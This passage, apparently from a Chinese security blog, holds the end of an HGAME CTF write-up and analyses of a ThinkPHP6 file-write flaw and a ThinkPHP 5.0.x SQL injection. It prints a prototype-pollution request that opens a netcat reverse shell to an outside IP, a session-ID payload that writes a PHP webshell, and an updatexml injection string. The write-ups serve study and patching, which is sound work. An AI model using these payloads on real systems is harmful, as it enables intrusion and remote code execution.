res.end(&quot;æäº¤æˆåŠŸ&quot;+JSON.stringify(req.body))})</code></pre><p>åœ¨æ³¨é‡Šå¤„æœ‰ä¸€ä¸ªå¥‡æ€ªçš„æ“ä½œ,è½¬æˆjsonå†è½¬æˆè§£ææˆobj</p><p>è¿™æ‘†æ˜äº†æœ‰é—®é¢˜,é‡åˆ°<code>JSON.parse+merge</code> ,æ€è·¯å¯ä»¥å¾€åŸå‹é“¾æ±¡æŸ“ä¸Šèµ°ä¸€èµ°</p><p>æˆ‘ä»¬ç»§ç»­é˜…è¯»ä»£ç </p><p>è·Ÿè¿›dealWithAttacks</p><pre><code class="javascript">this.dealWithAttacks = function (sekiro, solution) {        if (sekiro.attackInfo.solution !== solution) {            sekiro.health -= sekiro.attackInfo.attack            if (sekiro.attackInfo.additionalEffect) {                var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)                sekiro = fn(sekiro)//look this            }        }        sekiro.posture = (sekiro.posture &lt;= 500) ? sekiro.posture : 500        sekiro.health = (sekiro.health &gt; 0) ? sekiro.health : 0        if (sekiro.posture == 500 || sekiro.health == 0) {            sekiro.alive = false        }        return sekiro    }</code></pre><pre><code class="javascript">var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)                sekiro = fn(sekiro)</code></pre><p>æ˜æ˜¾çš„ä»£ç æ‰§è¡Œ,å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶<code>sekiro.attackInfo.additionalEffect</code>,é‚£ä¹ˆä¾¿å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†</p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹<code>sekiro.attackInfo.additionalEffect</code>æ˜¯å¦‚ä½•è·å¾—çš„</p><pre><code class="javascript">this.attacks = [        {            &quot;method&quot;: &quot;è¿ç»­ç å‡»&quot;,            &quot;attack&quot;: 1000,            &quot;additionalEffect&quot;: &quot;sekiro.posture+=100&quot;,            &quot;solution&quot;: &quot;è¿ç»­æ ¼æŒ¡&quot;        },        {            &quot;method&quot;: &quot;æ™®é€šæ”»å‡»&quot;,            &quot;attack&quot;: 500,            &quot;additionalEffect&quot;: &quot;sekiro.posture+=50&quot;,            &quot;solution&quot;: &quot;æ ¼æŒ¡&quot;        },        {            &quot;method&quot;: &quot;ä¸‹æ®µæ”»å‡»&quot;,            &quot;attack&quot;: 1000,            &quot;solution&quot;: &quot;è·³è·ƒè¸©å¤´&quot;        },        {            &quot;method&quot;: &quot;çªåˆºæ”»å‡»&quot;,            &quot;attack&quot;: 1000,            &quot;solution&quot;: &quot;è¯†ç ´&quot;        },        {            &quot;method&quot;: &quot;å·´ä¹‹é›·&quot;,            &quot;attack&quot;: 1000,            &quot;solution&quot;: &quot;é›·å&quot;        },    ]    this.getAttackInfo = function () {        return this.attacks[Math.floor(Math.random() * this.attacks.length)]    }</code></pre><p>æ˜¯ä»<code>attacks</code>ä¸­éšæœºæŒ‘ä¸€ä¸ªæ‹¿å‡ºæ¥çš„,è€Œå…¶ä¸­æŸäº›æ˜¯æ²¡æœ‰<code>additionalEffect</code>å±æ€§çš„</p><p>æ ¹æ®jsæ ¹æ®åŸå‹é“¾æ¥æŸ¥æ‰¾å±æ€§çš„ç‰¹æ€§</p><p>æˆ‘ä»¬å¯ä»¥ç”¨åŸå‹é“¾æ±¡æŸ“æ¥ä¿®æ”¹Objectçš„additionalEffectå±æ€§</p><p>payload:</p><pre><code>POST /action HTTP/1.1Host: sekiro.hgame.babelfish.inkContent-Length: 169Pragma: no-cacheCache-Control: no-cacheAccept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36Content-Type: application/json; charset=UTF-8Referer: http://sekiro.hgame.babelfish.ink/Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: session=s%3A1PZpvTS3HgeMcmNynPUdu4Yd8B4A7Rlt.c2nTB%2F99oXNjyJljMJ0HZugi0SJnsE4juq2ZboRTH0gConnection: close{&quot;solution&quot;:123,&quot;__proto__&quot;:{&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;nc 39.108.164.219 60000 -e /bin/sh&#39;,function(){});&quot;}}</code></pre><p>content-typeè¦è®¾ç½®æˆ<code>Content-Type: application/json</code></p><p>ä¸ç„¶<code>__proto__</code>æ˜¯æ— æ³•å½“åˆé”®çš„,é‚£ä¹ˆmergeä¹Ÿå°±æ²¡ç”¨äº†</p><p><code>hgame{j@v4scr1pt_pr0t0tYp3-poLLut1on_4tt4ck_1s_d@ng3r20us}</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="æ¬¢è¿å‚åŠ HGameï¼"><a href="#æ¬¢è¿å‚åŠ HGameï¼" class="headerlink" title="æ¬¢è¿å‚åŠ HGameï¼"></a>æ¬¢è¿å‚åŠ HGameï¼</h3><p> <a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/morse.php</a> </p><h3 id="å£çº¸"><a href="#å£çº¸" class="headerlink" title="å£çº¸"></a>å£çº¸</h3><p>å°±è¯´è¯´å’‹æ‹¿åˆ°å¯†ç çš„</p><p>å‹ç¼©æ–‡ä»¶æç¤º<code>End of Zip archive, comment: &quot;Password is picture ID.&quot;</code></p><p>åˆ©ç”¨æœç´¢å¼•æ“(<code>Pixiv@ç´”ç™½å¯æ†</code>)æ‹¿åˆ°å¯†ç </p><h3 id="å…‹è‹é²ç¥è¯"><a href="#å…‹è‹é²ç¥è¯" class="headerlink" title="å…‹è‹é²ç¥è¯"></a>å…‹è‹é²ç¥è¯</h3><p>è§£å‹å¾—åˆ°ä¸€ä¸ªæ–‡æœ¬å’Œä¸€ä¸ªå‹ç¼©åŒ…</p><p>è§‚å¯Ÿæ–‡æœ¬å’Œå‹ç¼©åŒ…å‘ç°,äºŒè€…çš„CRCå€¼ç›¸åŒ,äºæ˜¯è€ƒè™‘ç”¨æ˜æ–‡æ”»å‡»(ä¸å¥½æ„æ€,æˆ‘æ˜¯çœ‹ç€wikiéå†è¿‡å»çš„)</p><p>ç„¶åæ‹¿åˆ°é‡Œé¢çš„wordæ–‡æ¡£,ä½†æ˜¯æ˜¯åŠ å¯†çš„,çŒ.</p><p>åœ¨çœ‹ä¸€ä¸‹é‚£ä¸ªæ–‡æœ¬,æœ‰ç‚¹åƒåŸ¹æ ¹å¯†ç </p><pre><code class="python">s=&quot;of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.&quot;.replace(&quot; &quot;,&quot;&quot;)[:-1]result=&quot;&quot;for i in range(0,len(s),5):    temp=&quot;&quot;    for j in range(5):        if s[i+j]==s[i+j].lower():            temp+=&quot;0&quot;        else :            temp+=&quot;1&quot;    result+=chr(int(temp,2)+ord(&#39;A&#39;))print(result)</code></pre><p>äºæ˜¯æ‹¿åˆ°å¯†ç (HIDDENINTHEDOC),ä½†æ˜¯è¿˜æ²¡åˆ°å¤´!!!!!ç™¾åº¦ä¸€ä¸‹wordéšå†™,æœ€åæ‹¿åˆ°flag</p><h3 id="ç­¾åˆ°é¢˜ProPlus"><a href="#ç­¾åˆ°é¢˜ProPlus" class="headerlink" title="ç­¾åˆ°é¢˜ProPlus"></a>ç­¾åˆ°é¢˜ProPlus</h3><p>è§£å‹å¾—åˆ°password.txtå’Œok.zip</p><p>æ ¹æ®password.txtçš„æç¤º,æ …æ è§£å¯†+å‡¯æ’’å¯†ç å¾—åˆ°å‹ç¼©åŒ…å¯†ç .</p><p>æ‹¿åˆ°ä¸€å †ookç›´æ¥ä¸Šè°·æ­Œ.okäº†</p><p>base32-&gt;base64-&gt;äºŒç»´ç </p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>ç›´æ¥å¥—è„šæœ¬</p><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><pre><code class="python">#!/usr/bin/env python3# -*- coding: utf-8 -*-import gmpy2from secret import A, B, flagassert flag.startswith(&#39;hgame{&#39;) and flag.endswith(&#39;}&#39;)TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;MOD = len(TABLE)cipher = &#39;&#39;for b in flag:    i = TABLE.find(b)    if i == -1:        cipher += b    else:        ii = (A*i + B) % MOD        cipher += TABLE[ii]print(cipher)# A8I5z{xr1A_J7ha_vG_TpH410}</code></pre><p>æˆ‘ä»¬è§‚å¯Ÿå¯ä»¥å‘ç°è¿™å…¶å®æ˜¯ä¸ªå•è¡¨æ›¿æ¢åŠ å¯†</p><p>é‚£ä¹ˆæˆ‘ä»¬åªè¦ç”Ÿæˆç”Ÿæˆä¸€ä¸ªåŠ å¯†è¡¨å°±å¯ä»¥å¾ˆå®¹æ˜“çš„æ±‚å‡ºåŠ å¯†å†…å®¹</p><p>ä½†æ˜¯å”¯ä¸€éº»çƒ¦çš„æ˜¯æˆ‘ä»¬ä¸çŸ¥é“A,B,ä½†æ˜¯æˆ‘ä»¬çŸ¥é“æ˜æ–‡çš„å‰å‡ ä¸ªå­—ç¬¦hgame</p><p>äºæ˜¯æœ‰</p><pre><code class="python">TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;MOD = len(TABLE)cipher=&quot;A8I5z{xr1A_J7ha_vG_TpH410}&quot;for A in range(1,MOD):    for B in range(1,MOD):        result=&quot;&quot;        try :            #ç”ŸæˆåŠ å¯†è¡¨            TABLE2={}            for b in TABLE:                i=TABLE.find(b)                TABLE2[TABLE[(A*i + B) % MOD]]=b            #è§£å¯†            for b in cipher:                ii=TABLE.find(b)                if ii==-1:                    result+=b                else :                    result+=TABLE2[b]        except :            pass        if &quot;hgame&quot; in result:            print(result)</code></pre><h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p>è¿™ä¸ªæ˜¯ä½ç½®ç§»åŠ¨åŠ å¯†,è¾“å…¥ä¸€ä¸ªå’Œflagé•¿åº¦ç›¸åŒçš„å­—ç¬¦ä¸²å°±çŸ¥é“å¦‚ä½•è§£å¯†äº†</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>è¦†ç›–å˜é‡å€¼æ¥æ‰§è¡Œåé—¨å‡½æ•°</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/02/07/2020hgame/">https://explorersss.github.io/2020/02/07/2020hgame/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ</title>
      <link href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP6-ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ"><a href="#ThinkPHP6-ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ" class="headerlink" title="ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ"></a>ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><ol><li>ThinkPHP6.0.0-6.0.1</li><li>å¼€å¯Sessoinä¸­é—´ä»¶</li></ol><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>å®˜æ–¹commit: <a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p><p>å¤ç°ç¯å¢ƒä¸º:phpstudy+thinkphp6.0.1</p><p><code>\app\controller\index.php</code>:</p><pre><code class="php">&lt;?phpnamespace app\controller;use app\BaseController;use think\facade\Session;class Index extends BaseController{    public function index($name)    {        Session::set(&#39;name&#39;, $name);        return &#39;hello,&#39; . Session::get(&#39;name&#39;);;    }}</code></pre><p><code>\app\middleware.php</code></p><pre><code class="php">&lt;?php// å…¨å±€ä¸­é—´ä»¶å®šä¹‰æ–‡ä»¶return [    // å…¨å±€è¯·æ±‚ç¼“å­˜    // \think\middleware\CheckRequestCache::class,    // å¤šè¯­è¨€åŠ è½½    // \think\middleware\LoadLangPack::class,//     Sessionåˆå§‹åŒ–     \think\middleware\SessionInit::class];</code></pre><p>æ ¹æ®æ¼æ´çš„ä¿¡æ¯(ä»»æ„æ–‡ä»¶æ“ä½œ),æˆ‘ä»¬ä»<code>vendor\topthink\framework\src\think\session\Store.php</code> çš„<code>save</code>å‡½æ•°å¼€å§‹è¿›è¡Œåˆ†æ</p><pre><code class="php">public function save(): void    {        $this-&gt;clearFlashData();//æ¸…é™¤åŸæ¥çš„æ•°æ®        $sessionId = $this-&gt;getId();        if (!empty($this-&gt;data)) {            $data = $this-&gt;serialize($this-&gt;data);            $this-&gt;handler-&gt;write($sessionId, $data);        } else {            $this-&gt;handler-&gt;delete($sessionId);        }        $this-&gt;init = false;    }</code></pre><p>è·Ÿè¿›<code>$this-&gt;handler-&gt;write</code>æ–¹æ³•çœ‹ä¸€ä¸‹</p><pre><code class="php">public function write(string $sessID, string $sessData): bool    {        $filename = $this-&gt;getFileName($sessID, true);        $data     = $sessData;        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {            //æ•°æ®å‹ç¼©            $data = gzcompress($data, 3);        }        return $this-&gt;writeFile($filename, $data);    }</code></pre><p>å†è·Ÿè¿›<code>$this-&gt;writeFile</code></p><pre><code class="php">protected function writeFile($path, $content): bool    {        return (bool) file_put_contents($path, $content, LOCK_EX);    }</code></pre><p>å› ä¸º<code>$data</code>å¯æ§,é‚£ä¹ˆæˆ‘ä»¬åªè¦èƒ½æ§åˆ¶<code>$path</code>æˆ‘ä»¬å°±å¯ä»¥å†™shellè¿›å»äº†</p><p>è€Œ<code>$path</code>ç”±<code>$this-&gt;getFileName($sessID, true);</code>å¾—åˆ°</p><p>è·Ÿè¿›å»</p><pre><code class="php">    protected function getFileName(string $name, bool $auto = false): string    {        if ($this-&gt;config[&#39;prefix&#39;]) {            // ä½¿ç”¨å­ç›®å½•            $name = $this-&gt;config[&#39;prefix&#39;] . DIRECTORY_SEPARATOR . &#39;sess_&#39; . $name;        } else {            $name = &#39;sess_&#39; . $name;        }        $filename = $this-&gt;config[&#39;path&#39;] . $name;        $dir      = dirname($filename);        if ($auto &amp;&amp; !is_dir($dir)) {            try {                mkdir($dir, 0755, true);            } catch (\Exception $e) {                // åˆ›å»ºå¤±è´¥            }        }        return $filename;    }</code></pre><p><code>$filename</code>ç›´æ¥ç”±æœ«ç«¯æ‹¼æ¥å‚æ•°<code>$name</code></p><p>è€Œ<code>write</code>è°ƒç”¨<code>getFileName</code>æ—¶ç›´æ¥å°†å‚æ•°<code>$sessID</code>ä¼ å…¥,<code>$sessID</code>ç”±<code>$sessionId = $this-&gt;getId();</code>è·å¾—</p><pre><code class="php">    public function getId(): string    {        return $this-&gt;id;    }</code></pre><p><code>$this-&gt;id</code>æ—¶é€šè¿‡<code>setId()</code>æ¥è®¾ç½®çš„</p><pre><code class="php">    public function setId($id = null): void    {        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());    }</code></pre><p>å¦‚æœ<code>is_string($id) &amp;&amp; strlen($id) === 32</code>æ»¡è¶³,åˆ™ç›´æ¥å°†<code>$id</code>çš„å€¼èµ‹ç»™<code>$this-&gt;id</code></p><p>æŸ¥æ‰¾è°ƒç”¨setIdçš„å‡½æ•°</p><p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p><p>å…¶ä¸­<code>SessionInit</code></p><pre><code class="php">    public function handle($request, Closure $next)    {        // Sessionåˆå§‹åŒ–        $varSessionId = $this-&gt;app-&gt;config-&gt;get(&#39;session.var_session_id&#39;);        $cookieName   = $this-&gt;session-&gt;getName();        if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {            $sessionId = $request-&gt;request($varSessionId);        } else {            $sessionId = $request-&gt;cookie($cookieName);        }        if ($sessionId) {            $this-&gt;session-&gt;setId($sessionId);        }    }</code></pre><p>æŸ¥æ‰¾é…ç½®å‘ç°<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p><p>å› æ­¤æ„é€ payload</p><pre><code>http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3ECookie :PHPSESSID=9f7777c08f3909751b148338ba08.phpè®¿é—®http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</code></pre><h2 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h2><pre><code class="php">public function setId($id=null):void{    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 &amp;&amp; ctype_alnum($id) ? $id : md5(microtime(true) . session_create_id());}</code></pre><p>åœ¨<code>setId</code>ä¸­å¢åŠ äº†å¯¹<code>$id</code>çš„æ ¡éªŒ:<code>ctype_alnum($id)</code>,åªå…è®¸æ•°å­—æˆ–å­—æ¯,æ¥é¿å…ä»»æ„æ–‡ä»¶æ“ä½œ</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://paper.seebug.org/1114/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1114/#_1</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="https://explorersss.github.io/2020/02/01/ThinkPHP6">https://explorersss.github.io/2020/02/01/ThinkPHP6</a> ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ/](<a href="https://explorersss.github.io/2020/02/01/ThinkPHP6">https://explorersss.github.io/2020/02/01/ThinkPHP6</a> ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHPæ¡†æ¶5.0.x_SQLæ³¨å…¥åˆ†æ</title>
      <link href="/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
      <url>/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHPæ¡†æ¶5-0-x-SQLæ³¨å…¥åˆ†æ-amp-æ•°æ®åº“é…ç½®æ³„éœ²"><a href="#ThinkPHPæ¡†æ¶5-0-x-SQLæ³¨å…¥åˆ†æ-amp-æ•°æ®åº“é…ç½®æ³„éœ²" class="headerlink" title="ThinkPHPæ¡†æ¶5.0.x SQLæ³¨å…¥åˆ†æ &amp; æ•°æ®åº“é…ç½®æ³„éœ²"></a>ThinkPHPæ¡†æ¶5.0.x SQLæ³¨å…¥åˆ†æ &amp; æ•°æ®åº“é…ç½®æ³„éœ²</h1><h2 id="åº”ç”¨èŒƒå›´"><a href="#åº”ç”¨èŒƒå›´" class="headerlink" title="åº”ç”¨èŒƒå›´"></a>åº”ç”¨èŒƒå›´</h2><p>å¼€å¯debugæ¨¡å¼çš„thinkphp5.0.x</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ä»å®˜ç½‘ä¸Šä¸‹è½½5.0.9å®Œæ•´ç‰ˆ</p><p><code>application/index/controller/index.php</code>å†…å®¹å¦‚ä¸‹</p><pre><code class="php">&lt;?phpnamespace app\index\controller;use app\model\Gather;class Index{    public function index()    {        $ids = input(&#39;ids/a&#39;);        $t = db(&quot;user&quot;);        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();    }}</code></pre><p><img src="https://i.loli.net/2020/02/01/8hmETeuW31p5Zb6.png" alt="image460"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æˆ‘ä»¬åœ¨æ¼æ´çš„å…³é”®ä½ç½®ä¸‹ä¸ªæ–­ç‚¹è¿›è¡Œåˆ†æ,<code>thinkphp\library\think\db\Builder.php</code>:383è¡Œ</p><p>è°ƒç”¨å †æ ˆä¸º:</p><p><img src="https://i.loli.net/2020/02/01/YFfV74U8cxTLS2H.png" alt="image609"></p><p>ä»index()æ–¹æ³•å¼€å§‹</p><pre><code class="php">public function index()    {        $ids = input(&#39;ids/a&#39;);        $t = db(&quot;user&quot;);        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();    }</code></pre><p>è°ƒç”¨<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>è¿”å›å€¼çš„select()æ–¹æ³•</p><p>æˆ‘ä»¬å…ˆçœ‹ä¸‹select()æ–¹æ³•,å®ƒä¼šå°†<code>$option</code>ä½œä¸ºå‚æ•°è°ƒç”¨<code>Builder::select</code>æ–¹æ³•</p><pre><code class="php">public function select($data = null)    {        ...        // åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼        $options = $this-&gt;parseExpress();        ...        if (!$resultSet) {            // ç”ŸæˆæŸ¥è¯¢SQL            $sql = $this-&gt;builder-&gt;select($options);            // è·å–å‚æ•°ç»‘å®š            ...            }            ...    }</code></pre><p>æˆ‘ä»¬è·Ÿè¿›<code>$this-&gt;parseExpress();</code>çœ‹<code>$option</code>æ˜¯å¦‚ä½•ç”Ÿæˆçš„</p><pre><code class="php">protected function parseExpress()    {        $options = $this-&gt;options;        ...    }</code></pre><p>è¿™é‡Œæ˜¯ç›´æ¥ä»¤<code>$options = $this-&gt;options;</code>,è€Œ<code>$this-&gt;options</code>æ˜¯<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>è¿‡ç¨‹ç”Ÿæˆçš„</p><p>è·Ÿè¿›å»å‘ç°æœ‰è¿™ä¸€æ¡è¯­å¥ <code>$this-&gt;options[&#39;where&#39;][$logic] = array_merge($this-&gt;options[&#39;where&#39;][$logic], $where);</code>,å…¶ä¸­<code>$where</code>ç”±<code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code>å¾—åˆ°</p><p>è·å¾—<code>$option</code>çš„è°ƒç”¨é“¾ä¸º:</p><p><code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code> ( <code>public function where($field, $op = null, $condition = null)</code> ) =&gt; <code>$this-&gt;parseWhereExp(&#39;AND&#39;, $field, $op, $condition, $param);</code>  =&gt; <code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code> </p><p>æˆ‘ä»¬å›åˆ°<code>$this-&gt;builder-&gt;select($options);</code>,ç°åœ¨æˆ‘ä»¬çŸ¥é“<code>$this-&gt;options[&#39;where&#39;][$logic]</code>æ˜¯æˆ‘ä»¬çš„å¯æ§ä½ç½®</p><p>è·Ÿè¿›å»</p><pre><code class="php">public function select($options = [])    {        $sql = str_replace(            [&#39;%TABLE%&#39;, &#39;%DISTINCT%&#39;, &#39;%FIELD%&#39;, &#39;%JOIN%&#39;, &#39;%WHERE%&#39;, &#39;%GROUP%&#39;, &#39;%HAVING%&#39;, &#39;%ORDER%&#39;, &#39;%LIMIT%&#39;, &#39;%UNION%&#39;, &#39;%LOCK%&#39;, &#39;%COMMENT%&#39;, &#39;%FORCE%&#39;],            [                $this-&gt;parseTable($options[&#39;table&#39;], $options),                $this-&gt;parseDistinct($options[&#39;distinct&#39;]),                $this-&gt;parseField($options[&#39;field&#39;], $options),                $this-&gt;parseJoin($options[&#39;join&#39;], $options),                $this-&gt;parseWhere($options[&#39;where&#39;], $options),                $this-&gt;parseGroup($options[&#39;group&#39;]),                $this-&gt;parseHaving($options[&#39;having&#39;]),                $this-&gt;parseOrder($options[&#39;order&#39;], $options),                $this-&gt;parseLimit($options[&#39;limit&#39;]),                $this-&gt;parseUnion($options[&#39;union&#39;]),                $this-&gt;parseLock($options[&#39;lock&#39;]),                $this-&gt;parseComment($options[&#39;comment&#39;]),                $this-&gt;parseForce($options[&#39;force&#39;]),            ], $this-&gt;selectSql);        return $sql;    }</code></pre><p>è¿™ä¸ª<code>$this-&gt;parseWhere($options[&#39;where&#39;], $options)</code>åˆ†æ”¯è¿›å…¥äº†å…³é”®çš„æ¼æ´ä½ç½®,æ­¤æ—¶<code>$where</code>å¯æ§</p><pre><code class="php">protected function parseWhere($where, $options)    {        $whereStr = $this-&gt;buildWhere($where, $options);        ...        return empty($whereStr) ? &#39;&#39; : &#39; WHERE &#39; . $whereStr;    }</code></pre><p>å†è·Ÿè¿›<code>$this-&gt;buildWhere($where, $options)</code>,æ­¤æ—¶<code>$where</code>å¯æ§</p><pre><code class="php">public function buildWhere($where, $options)    {        if (empty($where)) {            $where = [];        }        if ($where instanceof Query) {            return $this-&gt;buildWhere($where-&gt;getOptions(&#39;where&#39;), $options);        }        $whereStr = &#39;&#39;;        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);        foreach ($where as $key =&gt; $val) {            $str = [];            foreach ($val as $field =&gt; $value) {                ...                    // å¯¹å­—æ®µä½¿ç”¨è¡¨è¾¾å¼æŸ¥è¯¢                    $field = is_string($field) ? $field : &#39;&#39;;                    $str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);            }            $whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);        }        return $whereStr;    }</code></pre><p><code>$whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);</code>è¿™ä¸ªç”Ÿæˆäº†sqlè¯­å¥çš„whereéƒ¨åˆ†,å…¶ä¸­<code>$str</code>æ˜¯ç”±<code>$str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code>ç”Ÿæˆçš„,è€Œå‚æ•°<code>$value[1]</code>å°±æ˜¯æˆ‘ä»¬<code>ids[1,updatexml(0,concat(0x7e,(database()),0x7e),1)]=123%23</code>payloadä¸­çš„é”®å€¼</p><p>è·Ÿè¿›<code>$this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code></p><pre><code class="php">protected function parseWhereItem($field, $val, $rule = &#39;&#39;, $options = [], $binds = [], $bindName = null)    {        $key = $field ? $this-&gt;parseKey($field, $options) : &#39;&#39;;        // æŸ¥è¯¢è§„åˆ™å’Œæ¡ä»¶        if (!is_array($val)) {            $val = [&#39;=&#39;, $val];        }        list($exp, $value) = $val;        // å­—æ®µåˆ†æ        if(....){            ...        } elseif (in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])) {            // IN æŸ¥è¯¢            if ($value instanceof \Closure) {                $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseClosure($value);            } else {                $value = is_array($value) ? $value : explode(&#39;,&#39;, $value);                if (array_key_exists($field, $binds)) {                    $bind  = [];                    $array = [];                    foreach ($value as $k =&gt; $v) {                        if 